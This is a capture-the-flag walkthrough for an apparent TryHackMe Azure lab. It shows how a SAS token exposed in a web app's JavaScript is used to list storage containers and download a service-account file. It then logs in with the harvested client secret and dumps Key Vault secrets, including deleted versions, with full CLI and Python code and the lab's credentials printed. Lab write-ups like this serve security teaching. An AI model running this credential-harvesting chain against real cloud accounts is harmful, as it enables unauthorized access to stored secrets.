# URL
https://tryhackme.com/room/hh-cryptocabana-f81cac95
# Concept
* Azure cloud security
* enumerating Azure SAS token security
* enumerating Azure containers and blobs
  * retrieving previous versions of blobs
* enumerating Azure key vault containers / blobs
# Method of solve
* we're directed to a website with an Azure-integrated web app `https://cryptocabanaf5scjagc.z13.web.core.windows.net/`
* the `app.js` script that the landing page uses includes data that we can use to enumerate the Azure containers associated with app:
```JS
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D";
```
* what we should pay attention to here are the permissions on the SAS token's `ss`, `sp`, and `srt` parameters
  * `ss` is allowed storage devices, and is set to `b`, blob storage
  * `sp` is storage permissions, and is set to `rl`, read and list
  * `srt` is allowed resource type, and is set to `sco`, service, container, object
* with this information, we can enumerate all of the containers associated with the `cryptocabanaf5scjagc` account
## Enumerating the Storage Containers
* using the methods below, we discover there are three containers, `$web`, `backup`, and `vault`
### With Python
```Python
# pip install azure-storage-blob

from azure.storage.blob import BlobServiceClient

storage_account = "cryptocabanaf5scjagc"

sas_token = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"

account_url = f"https://{storage_account}.blob.core.windows.net"

client = BlobServiceClient(
  account_url=account_url,
  credential=sas_token
)

for container in client.list_containers():
  print(container["name"])
```
### With Azure CLI
```Bash
az storage container list \
  --account-name cryptocabanaf5scjagc \
  --sas-token "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D" | grep "name"
```
## Listing the Blobs from the Containers
* next, we want to list all the blobs (files) from the containers, and discover the `backup-service-account.json` file
### With Azure CLI
```
STORAGE_ACCOUNT="cryptocabanaf5scjagc"
SAS_TOKEN="?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"
az storage blob list \    
  --account-name "$STORAGE_ACCOUNT" \
  --container-name vault \
  --sas-token "$SAS_TOKEN" \
  --query "[].name" \       
  --output tsv
```
### With Python
```Python
# pip install azure-storage-blob

from azure.storage.blob import BlobServiceClient

storage_account = "cryptocabanaf5scjagc"
container_name = "vault"

sas_token = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"

account_url = f"https://{storage_account}.blob.core.windows.net"

service_client = BlobServiceClient(
  account_url=account_url,
  credential=sas_token
)

container_client = service_client.get_container_client(container_name)

for blob in container_client.list_blobs():
  print(blob.name)
```
## Downloading the Blob from the Container
* now to download the `backup-service-account.json` file
* the json file has credentials for the key vault for this device
```
"client_id":"dbcf2923-e4eb-4b72-a0a4-688aa1185cf5"
"client_secret":"UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg"
"key_vault_name":"ccabana-kv-f5scjagc"
"key_vault_uri":"https://ccabana-kv-f5scjagc.vault.azure.net/"
"tenant_id":"8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"
```
### With Azure CLI
```Bash
az storage blob download \
  --account-name "$STORAGE_ACCOUNT" \
  --container-name vault \
  --name seed_phrase.txt \
  --sas-token "$SAS_TOKEN" \
  --file seed_phrase.txt
```
### With Python
```Python
from azure.storage.blob import BlobServiceClient

storage_account = "cryptocabanaf5scjagc"
container_name = "vault"
blob_name = "backup-service-account.json"

sas_token = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"

account_url = f"https://{storage_account}.blob.core.windows.net"

service_client = BlobServiceClient(
  account_url=account_url,
  credential=sas_token
)

blob_client = service_client.get_blob_client(
  container=container_name,
  blob=blob_name
)

with open(blob_name, "wb") as file:
  file.write(blob_client.download_blob().readall())
```
## Use the Captured Credentials to Enumerate the Key Vault
### With Azure CLI
```Bash
az login --service-principal -u "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5" -p "UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg" --tenant "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"
az keyvault secret list --vault-name ccabana-kv-f5scjagc | grep "name"
```
### With Python
See the next section
## Read the Secrets
* it turns out that the second part of the flag has been removed, but we can get the previous version of that secret
### With Azure CLI
```Bash
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name "key-shard-1" | grep "value"
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name "key-shard-2" | grep "value"
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name "key-shard-3" | grep "value"
```
### With Python
```Python
# pip install azure-identity azure-keyvault-secrets
from azure.identity import ClientSecretCredential
from azure.keyvault.secrets import SecretClient

tenant_id = "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"
client_id = "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5"
client_secret = "UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg"
vault_uri = "https://ccabana-kv-f5scjagc.vault.azure.net/"

credential = ClientSecretCredential(
    tenant_id=tenant_id,
    client_id=client_id,
    client_secret=client_secret
)

secret_client = SecretClient(vault_url=vault_uri, credential=credential)

secret_properties = secret_client.list_properties_of_secrets()

for secret_prop in secret_properties:
  secret_name = secret_prop.name
  retrieved_secret = secret_client.get_secret(secret_name)
  print(f"Secret name: {secret_name}\nSecret value: {retrieved_secret.value}")
```
## Get the Previous Version of the 2nd Flag Section
### With Azure CLI
```Bash
az keyvault secret list-versions --vault-name ccabana-kv-f5scjagc --name key-shard-2 --output json --query "[].id"
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-2 --version "3d6492d2c6f74123bc754a9ded22b2a0" --query "value" --output tsv
```
### With Python
```Python
# pip install azure-identity azure-keyvault-secrets
from azure.identity import ClientSecretCredential
from azure.keyvault.secrets import SecretClient

tenant_id = "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"
client_id = "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5"
client_secret = "UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg"
vault_uri = "https://ccabana-kv-f5scjagc.vault.azure.net/"
secret_name = "key-shard-2"

credential = ClientSecretCredential(
    tenant_id=tenant_id,
    client_id=client_id,
    client_secret=client_secret
)

secret_client = SecretClient(vault_url=vault_uri, credential=credential)

print(f"Fetching all versions for secret: {secret_name}\n")
version_properties = secret_client.list_properties_of_secret_versions(secret_name)

for prop in version_properties:
  version_id = prop.version
  print(f"Version ID: {version_id}")
  version_secret = secret_client.get_secret(secret_name, version=version_id)
  print(f"-> Value: {version_secret.value}\n")
```
